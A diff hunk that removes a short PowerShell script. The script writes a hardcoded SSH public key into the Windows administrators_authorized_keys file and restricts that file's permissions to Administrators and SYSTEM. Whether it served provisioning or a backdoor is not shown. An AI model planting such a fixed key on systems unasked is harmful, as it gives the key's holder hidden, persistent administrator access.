@@ -1,16 +1,1 @@
-$publicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOBKUqhit+/vGVJjcmN3ElQp937YWIaPPAKAQEqmZq8G"
-$keyPath = "$env:ProgramData\ssh\administrators_authorized_keys"
-$match = Select-String -Path $keyPath -Pattern $publicKey -Quiet
-if ($match) {
-    Write-Host "Exist exiting"
-    exit
-}
-Add-Content -Path "$env:ProgramData\ssh\administrators_authorized_keys" -Value $publicKey -Force -ErrorAction SilentlyContinue
-$acl = Get-Acl "$env:ProgramData\ssh\administrators_authorized_keys"
-$acl.SetAccessRuleProtection($true, $false)
-$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
-$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
-$acl.SetAccessRule($administratorsRule)
-$acl.SetAccessRule($systemRule)
-$acl | Set-Acl
 
